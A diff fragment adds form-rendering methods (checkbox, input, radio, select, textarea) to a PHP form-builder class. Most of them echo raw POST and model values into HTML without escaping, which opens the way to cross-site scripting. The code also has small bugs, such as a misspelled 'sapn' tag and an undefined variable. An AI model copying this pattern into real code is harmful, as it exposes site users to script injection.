+            $postFlag = TRUE;
+        }
+        if (is_array($values)) {
+            foreach ($values as $key => $value) {
+                $body.= '<input type="checkbox" name="' . $name . '" id="' . $name . '" value="' . $key . '"';
+                if (($hasBracket = $this->getBracket($name)) !== FALSE && $postFlag !== FALSE && isset($_POST[$hasBracket['field']][$hasBracket['in']]) && $_POST[$hasBracket['field']][$hasBracket['in']] == $key) {
+                    $body.= ' checked';
+                } elseif ($postFlag === TRUE && isset($_POST[$name]) && $_POST[$name] == $key) {
+                    $body.= ' checked';
+                } elseif ($default == $key) {
+                    $body.= ' checked';
+                }
+                if (!empty($data['in'])) {
+                    $body.= ' ' . $data['in'];
+                }
+                $body.= ' />';
+                $body.= '<span style="padding-left:10px">' . $value . '</span>';
+            }
+        } else
+        //it is just a string, no value
+        {
+            $body.= '<input type="checkbox" name="' . $name . '" id="' . $name . '"';
+            if (($hasBracket = $this->getBracket($name)) !== FALSE && $postFlag !== FALSE && isset($_POST[$hasBracket['field']][$hasBracket['in']]) && $_POST[$hasBracket['field']][$hasBracket['in']] == 'on') {
+                $body.= ' checked';
+            } elseif ($postFlag === TRUE && isset($_POST[$name]) && $_POST[$name] == 'on') {
+                $body.= ' checked';
+            }
+            if (!empty($data['in'])) {
+                $body.= ' ' . $data['in'];
+            }
+            $body.= ' />';
+            $body.= '<span>' . $values . '</span>';
+        }
+        $showFieldErrorText = FALSE;
+        if (!empty(self::$errors[$name])) {
+            $showFieldErrorText = isset($data['showFieldErrorText']) ? $data['showFieldErrorText'] : $this->showFieldErrorText;
+            if ($showFieldErrorText) {
+                $body.= ' <sapn class="error">';
+                $body.= self::$errors[$name];
+                $body.= '</span>';
+                $showFieldErrorText = TRUE;
+            }
+        }
+        if (isset($data['out']) && $showFieldErrorText === FALSE) {
+            $body.= $data['out'];
+        }
+        if ($decoration === TRUE) {
+            $body.= '</p>';
+        }
+        return $body;
+    }
+    ///???????????????911913-amount
+    public function extra($main, $other) {
+        if (!empty($other['reference'])) {
+            if (is_array($other['reference'])) {
+                foreach ($other['reference'] as $reference) {
+                    $model = CView::getVar($reference);
+                    if (strpos($main, '$' . $reference) !== FALSE) {
+                        $main = str_replace('$' . $reference, $model, $main);
+                    }
+                }
+            } else {
+                $model = CView::getVar($other['reference']);
+                if (strpos($main, '$' . $other['reference']) !== FALSE) {
+                    $main = str_replace('$' . $other['reference'], $model, $main);
+                }
+            }
+        }
+        return $main;
+    }
+    public function makeField($name, $data) {
+        $decoration = TRUE;
+        if (isset($data['decoration']) && $data['decoration'] === FALSE) $decoration = FALSE;
+        $body = '';
+        if ($decoration === TRUE && $data['type'] != 'hidden') {
+            $body.= '<p><label for="' . $name . '">';
+            if ($data['type'] != 'submit') {
+                $body.= $this->getLabel($name, $data);
+            } else $body.= '&nbsp;';
+            $body.= '</label>';
+        }
+        $body.= '<input type="' . $data['type'] . '" name="' . $name . '" id="' . $name . '" value="';
+        $post = isset($data['post']) ? $data['post'] : TRUE;
+        $reference = empty($data['reference']) ? '' : $data['reference'];
+        if (($hasBracket = $this->getBracket($name)) !== FALSE && isset($_POST[$hasBracket['field']][$hasBracket['in']]) && $post !== FALSE) {
+            $body.= $_POST[$hasBracket['field']][$hasBracket['in']];
+        } elseif (isset($_POST[$name]) && $post !== FALSE) {
+            $body.= $_POST[$name];
+        } elseif (($modelValue = $this->getRefValue($name, $reference)) !== FALSE) {
+            $body.= $modelValue;
+        } elseif (isset($data['value'])) {
+            $body.= $data['value'];
+        }
+        $body.= '"';
+        if (isset($data['in'])) {
+            $body.= ' ' . $data['in'];
+        }
+        if (!empty(self::$errors[$name])) {
+            $showFieldErrorColor = isset($data['showFieldErrorColor']) ? $data['showFieldErrorColor'] : $this->showFieldErrorColor;
+            if ($showFieldErrorColor) {
+                $body.= ' style="background:#FFE3E4"';
+            }
+        }
+        $body.= ' />';
+        $showFieldErrorText = FALSE;
+        if (!empty(self::$errors[$name])) {
+            $showFieldErrorText = isset($data['showFieldErrorText']) ? $data['showFieldErrorText'] : $this->showFieldErrorText;
+            if ($showFieldErrorText) {
+                $body.= ' <sapn class="error">';
+                $body.= self::$errors[$name];
+                $body.= '</span>';
+                $showFieldErrorText = TRUE;
+            }
+        }
+        if (isset($data['out']) && $showFieldErrorText === FALSE) {
+            $body.= $data['out'];
+        }
+        if ($decoration === TRUE && $data['type'] != 'hidden') $body.= '</p>';
+        return $body;
+    }
+    public function radio($name, $data) {
+        $decoration = TRUE;
+        if (isset($data['decoration']) && $data['decoration'] === FALSE) $decoration = FALSE;
+        $body = '';
+        if ($decoration === TRUE) {
+            $body.= '<p><label for="' . $name . '">';
+            $body.= $this->getLabel($name, $data);
+            $body.= '</label>';
+        }
+        $modelValue = '';
+        $postFlag = TRUE;
+        $default = '';
+        $values = '';
+        $reference = empty($data['reference']) ? '' : $data['reference'];
+        $modelValue = $this->getRefValue($name, $reference);
+        if (isset($data['post'])) $postFlag = $data['post'];
+        if (isset($data['value'])) {
+            $values = $data['value'];
+            if (isset($data['values']['default'])) $default = $data['default'];
+        }
+        if (is_array($values)) {
+            $hasBracket = $this->getBracket($name);
+            foreach ($values as $key => $value) {
+                if ($decoration === TRUE) {
+                    if (isset($data['veritical']) && $data['veritical'] == TRUE) $body.= '<p>';
+                    else $body.= '&nbsp;&nbsp;';
+                }
+                $body.= '<input type="radio" name="' . $name . '"';
+                $body.= ' value="' . $key . '"';
+                if ($hasBracket !== FALSE && $postFlag !== FALSE && isset($_POST[$hasBracket['field']][$hasBracket['in']]) && $_POST[$hasBracket['field']][$hasBracket['in']] == $key) {
+                    $body.= ' checked="checked"';
+                } elseif ($postFlag === TRUE && isset($_POST[$name]) && $_POST[$name] == $key) {
+                    $body.= ' checked="checked"';
+                } elseif ($modelValue == $key) {
+                    $body.= ' checked="checked"';
+                } elseif ($default == $key) {
+                    $body.= ' checked="checked"';
+                }
+                if (!empty($data['in'])) {
+                    if (is_array($data['in']) && isset($data['in'][$key])) {
+                        $body.= ' ' . $data['in'][$key];
+                    } else $body.= ' ' . $data['in'];
+                }
+                $body.= ' />';
+                if (is_string($value)) {
+                    $body.= '<span>' . $value . '</span>';
+                }
+                if ($decoration === TRUE) {
+                    if (isset($data['veritical']) && $data['veritical'] == TRUE) $body.= '<p>';
+                }
+            }
+        } else {
+            $body.= '<input type="radio" name="' . $name . '"';
+            $body.= ' value="' . $values . '"';
+            if (($hasBracket = $this->getBracket($name)) !== FALSE && $postFlag !== FALSE && isset($_POST[$hasBracket['field']][$hasBracket['in']]) && $_POST[$hasBracket['field']][$hasBracket['in']] == $data) {
+                $body.= ' checked="checked"';
+            } elseif ($postFlag === TRUE && isset($_POST[$name]) && $_POST[$name] == $data) {
+                $body.= ' checked="checked"';
+            } elseif ($modelValue == $data) {
+                $body.= ' checked="checked"';
+            } elseif ($default == $data) {
+                $body.= ' checked="checked"';
+            }
+            if (!empty($data['type'])) {
+                $body.= ' ' . $data['type'];
+            }
+            $body.= ' />';
+        }
+        $showFieldErrorText = FALSE;
+        if (!empty(self::$errors[$name])) {
+            $showFieldErrorText = isset($data['showFieldErrorText']) ? $data['showFieldErrorText'] : $this->showFieldErrorText;
+            if ($showFieldErrorText) {
+                $body.= ' <sapn class="error">';
+                $body.= self::$errors[$name];
+                $body.= '</span>';
+                $showFieldErrorText = TRUE;
+            }
+        }
+        if (isset($data['out']) && $showFieldErrorText === FALSE) {
+            $body.= $data['out'];
+        }
+        if ($decoration === TRUE) {
+            $body.= '</p>';
+        }
+        return $body;
+    }
+    public function select($name, $data) {
+        $decoration = TRUE;
+        if (isset($data['decoration']) && $data['decoration'] === FALSE) $decoration = FALSE;
+        $body = '';
+        if ($decoration === TRUE) {
+            $body.= '<p><label for="' . $name . '">';
+            $body.= $this->getLabel($name, $data);
+            $body.= '</label>';
+        }
+        $body.= '<select name="' . $name . '" id="' . $name . '"';
+        if (!empty($data['in'])) {
+            $body.= ' ' . $data['in'];
+        }
+        if (!empty(self::$errors[$name])) {
+            $showFieldErrorColor = isset($data['showFieldErrorColor']) ? $data['showFieldErrorColor'] : $this->showFieldErrorColor;
+            if ($showFieldErrorColor) {
+                $body.= ' style="background:#FFE3E4"';
+            }
+        }
+        $body.= ' >';
+        $modelValue = '';
+        if (isset($data['options']) && is_string($data['options'])) {
+            $data['options'] = $this->specialOption($data['options']);
+        }
+        if (isset($data['options']) && is_array($data['options'])) {
+            $body.= $this->options($data, $name);
+        }
+        $body.= '</select>';
+        $showFieldErrorText = FALSE;
+        if (!empty(self::$errors[$name])) {
+            $showFieldErrorText = isset($data['showFieldErrorText']) ? $data['showFieldErrorText'] : $this->showFieldErrorText;
+            if ($showFieldErrorText) {
+                $body.= ' <sapn class="error">';
+                $body.= self::$errors[$name];
+                $body.= '</span>';
+                $showFieldErrorText = TRUE;
+            }
+        }
+        if (isset($data['out']) && $showFieldErrorText == FALSE) {
+            $body.= $data['out'];
+        }
+        if ($decoration === TRUE) $body.= '</p>';
+        return $body;
+    }
+    public function options($data, $fieldName) {
+        $body = '';
+        if (isset($data['default'])) {
+            $body.= '<option value="">' . $data['default'] . '</option>';
+        }
+        $post = isset($data['post']) ? $data['post'] : TRUE;
+        $reference = empty($data['reference']) ? '' : $data['reference'];
+        $modelValue = $this->getRefValue($fieldName, $reference);
+        if (isset($data['options'])) $data = $data['options'];
+        if (isset($data['default'])) {
+            $body.= '<option value="">' . $data['default'] . '</option>';
+        }
+        $hasBracket = $this->getBracket($fieldName);
+        foreach ($data as $key => $value) {
+            if ($key == 'default') continue;
+            $body.= '<option value="' . $key . '"';
+            if ($post === TRUE && $hasBracket !== FALSE && isset($_POST[$hasBracket['field']][$hasBracket['in']]) && $_POST[$hasBracket['field']][$hasBracket['in']] == $key) {
+                $body.= ' selected="selected"';
+            } elseif ($post === TRUE && isset($_POST[$fieldName]) && $_POST[$fieldName] == $key) {
+                $body.= ' selected="selected"';
+            } elseif ($modelValue == $key) {
+                $body.= ' selected="selected"';
+            }
+            $body.= '>' . $value . '</option>';
+        }
+        return $body;
+    }
+    public function specialOption($option) {
+        $result = FALSE;
+        if ($option == 'days_of_month') {
+            $result = array('default' => 'روز', 1 => 1, 2 => 2, 3 => 3, 4 => 4, 5 => 5, 6 => 6, 7 => 7, 8 => 8, 9 => 9, 10 => 10, 11 => 11, 12 => 12, 13 => 13, 14 => 14, 15 => 15, 16 => 16, 17 => 17, 18 => 18, 19 => 19, 20 => 20, 21 => 21, 22 => 22, 23 => 23, 24 => 24, 25 => 25, 26 => 26, 27 => 27, 28 => 28, 29 => 29, 30 => 30, 31 => 31,);
+        } elseif ($option == 'months_of_year') {
+            $result = array('default' => 'ماه', 1 => '01', 2 => '02', 3 => '03', 4 => '04', 5 => '05', 6 => '06', 7 => '07', 8 => '08', 9 => '09', 10 => '10', 11 => '11', 12 => '12',);
+        } elseif (stripos($option, 'years') !== FALSE) {
+            if (($first_ = strpos($option, '_')) !== FALSE) {
+                $numbers = substr($option, $first_ + 1);
+                if (($last_ = strpos($numbers, '_')) !== FALSE) {
+                    $minNum = (int)substr($numbers, 0, $last_);
+                    $maxNum = (int)ltrim(strstr($numbers, '_'), '_');
+                    $result = array('default' => 'سال',);
+                    for ($i = $minNum;$i <= $maxNum;$i++) {
+                        $result[$i] = $i;
+                    }
+                }
+            }
+        } elseif (stripos($option, 'numbers') !== FALSE) {
+            if (($first_ = strpos($option, '_')) !== FALSE) {
+                $numbers = substr($option, $first_ + 1);
+                if (($last_ = strpos($numbers, '_')) !== FALSE) {
+                    $minNum = (int)substr($numbers, 0, $last_);
+                    $maxNum = (int)ltrim(strstr($numbers, '_'), '_');
+                    $result = array('default' => 'انتخاب',);
+                    for ($i = $minNum;$i <= $maxNum;$i++) {
+                        $result[$i] = $i;
+                    }
+                }
+            }
+        }
+        return $result;
+    }
+    public function textarea($name, $data) {
+        $decoration = TRUE;
+        if (isset($data['decoration']) && $data['decoration'] === FALSE) $decoration = FALSE;
+        $body = '';
+        if ($decoration === TRUE) {
+            $body.= '<p><label for="' . $name . '">';
+            $body.= $this->getLabel($name, $data);
+            $body.= '</label>';
+        }
+        $body.= '<textarea  name="' . $name . '" id="' . $name . '"';
+        if (isset($data['rows'])) {
+            $body.= ' rows=' . $data['rows'];
+        }
+        if (isset($data['cols'])) {
+            $body.= ' cols=' . $data['cols'];
+        }
+        if (isset($data['in'])) {
+            $body.= ' ' . $data['in'];
+        }
+        if (!empty(self::$errors[$name])) {
+            $showFieldErrorColor = isset($data['showFieldErrorColor']) ? $data['showFieldErrorColor'] : $this->showFieldErrorColor;
+            if ($showFieldErrorColor) {
+                $body.= ' style="background:#FFE3E4"';
+            }
+        }
+        $body.= '>';
+        $post = isset($data['post']) ? $data['post'] : TRUE;
+        $reference = empty($values['reference']) ? '' : $values['reference'];
+        if ($post !== FALSE && ($hasBracket = $this->getBracket($name)) !== FALSE && isset($_POST[$hasBracket['field']][$hasBracket['in']])) {
+            $body.= $_POST[$hasBracket['field']][$hasBracket['in']];
+        }
+        if (isset($_POST[$name]) && $post !== FALSE) {
+            $body.= $_POST[$name];
+        } elseif (($modelValue = $this->getRefValue($name, $reference)) !== FALSE) $body.= $modelValue;
+        elseif (isset($data['value'])) {
+            $body.= $data['value'];
+        }
+        $body.= '</textarea>';
+        $showFieldErrorText = FALSE;
+        if (!empty(self::$errors[$name])) {
+            $showFieldErrorText = isset($data['showFieldErrorText']) ? $data['showFieldErrorText'] : $this->showFieldErrorText;
+            if ($showFieldErrorText) {
+                $body.= ' <sapn class="error">';
+                $body.= self::$errors[$name];
+                $body.= '</span>';
+                $showFieldErrorText = TRUE;
+            }
+        }
+        if (isset($data['out']) && $showFieldErrorText === FALSE) {
+            $body.= $data['out'];
+        }
+        if ($decoration === TRUE) $body.= '</p>';
+        return $body;
+    }
+    private function getRefValue($name, $referenceName = '') {
+        $reference = empty($referenceName) ? $this->reference : CView::getVar($referenceName);
+        if (!empty($reference)) {
+            if (is_object($reference)) {
+                if (isset($reference->$name)) return $reference->$name;
+                return FALSE;
+            } elseif (is_array($reference)) {
+                if (isset($reference[$name])) return $reference[$name];
+                return FALSE;
+            } else {
+                return $reference;
+            }
+            return FALSE;
+        }
+        return FALSE;
+    }
+    private function getBracket($param) {
+        //grade[0]
+        if (($startPos = strpos($param, '[')) !== FALSE) {
+            $endPos = strrpos($param, ']');
+            $length = $endPos - $startPos - 1;
+            $result['in'] = substr($param, $startPos + 1, $length);
+            $result['field'] = substr($param, 0, $startPos);
+            return $result;
+        }
+        return FALSE;
+    }
+}
 ?>
